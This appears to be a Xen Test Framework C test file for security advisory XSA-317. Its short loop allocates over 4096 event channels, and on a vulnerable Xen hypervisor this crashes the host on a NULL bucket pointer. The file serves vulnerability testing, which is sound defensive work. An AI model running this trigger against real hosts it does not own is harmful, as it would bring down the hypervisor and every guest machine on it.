/**
 * @file tests/xsa-317/main.c
 * @ref test-xsa-317
 *
 * @page test-xsa-317 XSA-317
 *
 * Advisory: [XSA-317](https://xenbits.xen.org/xsa/advisory-317.html)
 *
 * This vulnerability affects:
 * - HVM and 32-bit PV guests allowed to use more than 1024 event channels.
 * - 64-bit guests allowed to use more than 4096 event channels.
 *
 * The testcase will try to allocate more than 4096 event channels. On
 * vulnerable platform, Xen will fall over a NULL evtchn bucket pointer.
 *
 * @see tests/xsa-317/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-317 PoC";

void test_main(void)
{
    unsigned int i;
    struct evtchn_alloc_unbound ub = {
        .dom = DOMID_SELF,
        .remote_dom = 0,
    };

    /*
     * Create more event channels than the 4096 ABI limit.  A fixed Xen, or
     * not vulnerable configuration, should fail with -ENOSPC eventually.
     */
    for ( i = 0; i < 4100; ++i )
    {
        int rc = hypercall_evtchn_alloc_unbound(&ub);

        if ( rc == -ENOSPC )
            break;

        if ( rc )
            return xtf_error("Error: Unexpected alloc_unbound error %d\n", rc);
    }

    /*
     * If Xen is still alive, it didn't fall over a NULL evtchn bucket
     * pointer.
     */
    xtf_success("Success: Not vulnerable to XSA-317\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
